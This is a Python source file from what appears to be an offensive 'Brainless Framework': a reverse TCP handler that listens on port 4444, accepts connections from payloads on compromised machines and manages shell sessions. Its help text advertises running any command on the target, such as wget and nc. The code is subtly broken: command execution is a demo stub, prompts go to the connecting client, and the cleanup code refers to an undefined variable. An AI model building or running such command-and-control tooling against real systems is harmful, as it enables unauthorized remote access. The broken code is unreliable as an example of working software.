"""
Brainless Framework - Reverse TCP Handler
==========================================

Handler for managing reverse TCP connections from payloads.
Listens for incoming connections and provides interactive shell sessions.

Author: Brainless Security Team
"""

import socket
import threading
import time
import sys
import select
from typing import Dict, List, Optional, Any
from dataclasses import dataclass
from core.logger import LoggerMixin


@dataclass
class ConnectionInfo:
    """Information about an active connection"""
    conn_id: str
    socket: socket.socket
    address: tuple
    connected_at: str
    last_activity: str
    session_id: Optional[str] = None


class ReverseTCPHandler(LoggerMixin):
    """
    Handler for reverse TCP connections
    
    Features:
    - Multi-client support
    - Interactive shell sessions
    - Command history
    - Session management
    """
    
    def __init__(self, host='0.0.0.0', port=4444, max_clients=10):
        """
        Initialize the reverse TCP handler
        
        Args:
            host (str): Host to bind to
            port (int): Port to listen on
            max_clients (int): Maximum number of concurrent clients
        """
        super().__init__('ReverseTCPHandler')
        
        self.host = host
        self.port = port
        self.max_clients = max_clients
        
        self.server_socket = None
        self.clients: Dict[str, ConnectionInfo] = {}
        self.client_counter = 1
        self.running = False
        
        self.info(f"Initialized reverse TCP handler on {host}:{port}")
    
    def start(self):
        """Start the handler"""
        if self.running:
            self.warning("Handler is already running")
            return
        
        try:
            # Create server socket
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            # Bind and listen
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(self.max_clients)
            
            self.running = True
            
            self.info(f"Listening on {self.host}:{self.port}")
            print(f"[*] Reverse TCP handler started on {self.host}:{self.port}")
            print(f"[*] Waiting for connections... (max {self.max_clients} clients)")
            print("[*] Use 'help' for available commands")
            print()
            
            # Start accepting connections
            self._accept_connections()
            
        except Exception as e:
            self.error(f"Failed to start handler: {e}")
            raise
    
    def stop(self):
        """Stop the handler"""
        self.running = False
        
        # Close all client connections
        for client_info in list(self.clients.values()):
            try:
                client_info.socket.close()
            except:
                pass
        
        self.clients.clear()
        
        # Close server socket
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass
        
        self.info("Handler stopped")
        print("[*] Handler stopped")
    
    def _accept_connections(self):
        """Accept incoming connections"""
        try:
            while self.running:
                try:
                    # Use select to handle timeouts and allow for graceful shutdown
                    ready, _, _ = select.select([self.server_socket], [], [], 1.0)
                    
                    if ready:
                        client_socket, client_address = self.server_socket.accept()
                        
                        # Create client info
                        conn_id = f"client_{self.client_counter:03d}"
                        self.client_counter += 1
                        
                        client_info = ConnectionInfo(
                            conn_id=conn_id,
                            socket=client_socket,
                            address=client_address,
                            connected_at=time.strftime('%Y-%m-%d %H:%M:%S'),
                            last_activity=time.strftime('%Y-%m-%d %H:%M:%S')
                        )
                        
                        self.clients[conn_id] = client_info
                        
                        self.info(f"New connection: {conn_id} from {client_address}")
                        print(f"[+] Connection from {client_address[0]}:{client_address[1]} ({conn_id})")
                        
                        # Start client handler thread
                        client_thread = threading.Thread(
                            target=self._handle_client,
                            args=(client_info,),
                            daemon=True
                        )
                        client_thread.start()
                        
                except socket.error:
                    # Socket error during accept (likely during shutdown)
                    if self.running:
                        raise
        
        except Exception as e:
            if self.running:
                self.error(f"Error accepting connections: {e}")
    
    def _handle_client(self, client_info: ConnectionInfo):
        """Handle communication with a client"""
        try:
            # Send welcome message
            welcome_msg = f"""
╔══════════════════════════════════════════════════════════════╗
║                    Reverse Shell Connected                   ║
║                                                              ║
║  Client: {client_info.conn_id:<46}║
║  Host: {client_info.address[0]:<50}║
║  Port: {client_info.address[1]:<50}║
║  Time: {client_info.connected_at:<50}║
║                                                              ║
║  Commands:                                                   ║
║    help     - Show this help message                         ║
║    sessions - List active sessions                           ║
║    interact - Interact with a session                        ║
║    background - Background current session                   ║
║    exit     - Close connection                               ║
╚══════════════════════════════════════════════════════════════╝

"""
            client_info.socket.send(welcome_msg.encode())
            
            # Start interactive session
            self._interactive_session(client_info)
            
        except Exception as e:
            self.error(f"Error handling client {client_info.conn_id}: {e}")
        finally:
            # Clean up connection
            try:
                client_info.socket.close()
            except:
                pass
            
            if client_info.conn_id in self.clients:
                del self.clients[client_info.conn_id]
            
            self.info(f"Connection closed: {client_info.conn_id}")
            print(f"[-] Connection closed: {client_info.address[0]}:{client_address[1]} ({client_info.conn_id})")
    
    def _interactive_session(self, client_info: ConnectionInfo):
        """Handle interactive session with client"""
        command_history = []
        current_command = ""
        
        try:
            while self.running:
                # Send prompt
                prompt = f"{client_info.conn_id}> "
                client_info.socket.send(prompt.encode())
                
                # Receive command
                command = b""
                while not command.endswith(b'\n'):
                    try:
                        data = client_info.socket.recv(1)
                        if not data:
                            return  # Connection closed
                        command += data
                    except socket.timeout:
                        continue
                    except:
                        return  # Connection error
                
                # Update last activity
                client_info.last_activity = time.strftime('%Y-%m-%d %H:%M:%S')
                
                # Decode command
                try:
                    command_str = command.decode('utf-8').strip()
                except:
                    command_str = command.decode('utf-8', errors='ignore').strip()
                
                if not command_str:
                    continue
                
                # Add to history
                if command_str not in command_history:
                    command_history.append(command_str)
                
                # Process command
                if command_str.lower() == 'exit':
                    client_info.socket.send(b"Goodbye!\n")
                    return
                elif command_str.lower() == 'help':
                    help_msg = """
Available Commands:
  help        - Show this help message
  sessions    - List active sessions
  clear       - Clear the screen
  exit        - Close this connection

System Commands:
  You can execute any system command available on the target.
  Examples:
    whoami           - Show current user
    pwd              - Show current directory
    ls               - List files
    cat <file>       - Read file
    wget <url>       - Download file
    nc <host> <port> - Netcat connection
"""
                    client_info.socket.send(help_msg.encode())
                elif command_str.lower() == 'sessions':
                    session_list = self._get_session_list()
                    client_info.socket.send(session_list.encode())
                elif command_str.lower() == 'clear':
                    client_info.socket.send(b"\033[2J\033[H")  # Clear screen ANSI codes
                else:
                    # Forward command to client (in a real implementation,
                    # this would be handled by the payload on the target)
                    response = f"[*] Executing: {command_str}\n"
                    response += "[*] This is a demo response.\n"
                    response += "[*] In a real scenario, this would execute on the target.\n"
                    client_info.socket.send(response.encode())
                
                # Small delay to prevent overwhelming the connection
                time.sleep(0.1)
                
        except Exception as e:
            self.error(f"Error in interactive session: {e}")
    
    def _get_session_list(self) -> str:
        """Get list of active sessions"""
        if not self.clients:
            return "[*] No active sessions\n"
        
        session_list = "\nActive Sessions:\n"
        session_list += "=" * 60 + "\n"
        session_list += f"{'ID':<10} {'Host':<16} {'Port':<6} {'Connected At':<20}\n"
        session_list += "-" * 60 + "\n"
        
        for client_info in self.clients.values():
            session_list += f"{client_info.conn_id:<10} {client_info.address[0]:<16} "
            session_list += f"{client_info.address[1]:<6} {client_info.connected_at:<20}\n"
        
        session_list += "=" * 60 + "\n"
        return session_list
    
    def get_client_count(self) -> int:
        """Get number of connected clients"""
        return len(self.clients)
    
    def list_clients(self) -> List[Dict[str, Any]]:
        """Get list of all connected clients"""
        client_list = []
        for client_info in self.clients.values():
            client_list.append({
                'id': client_info.conn_id,
                'host': client_info.address[0],
                'port': client_info.address[1],
                'connected_at': client_info.connected_at,
                'last_activity': client_info.last_activity
            })
        return client_list
    
    def send_command_to_client(self, client_id: str, command: str) -> bool:
        """
        Send a command to a specific client
        
        Args:
            client_id (str): Client identifier
            command (str): Command to send
        
        Returns:
            bool: True if command sent successfully, False otherwise
        """
        client_info = self.clients.get(client_id)
        if not client_info:
            return False
        
        try:
            client_info.socket.send(f"{command}\n".encode())
            return True
        except:
            return False
    
    def broadcast_message(self, message: str):
        """Send a message to all connected clients"""
        for client_info in self.clients.values():
            try:
                client_info.socket.send(f"[BROADCAST] {message}\n".encode())
            except:
                pass


def main():
    """Main function for standalone execution"""
    import argparse
    
    parser = argparse.ArgumentParser(description="Brainless Framework - Reverse TCP Handler")
    parser.add_argument('--host', default='0.0.0.0', help='Host to bind to (default: 0.0.0.0)')
    parser.add_argument('--port', type=int, default=4444, help='Port to listen on (default: 4444)')
    parser.add_argument('--max-clients', type=int, default=10, help='Maximum number of clients (default: 10)')
    
    args = parser.parse_args()
    
    handler = ReverseTCPHandler(args.host, args.port, args.max_clients)
    
    try:
        handler.start()
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
        handler.stop()
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()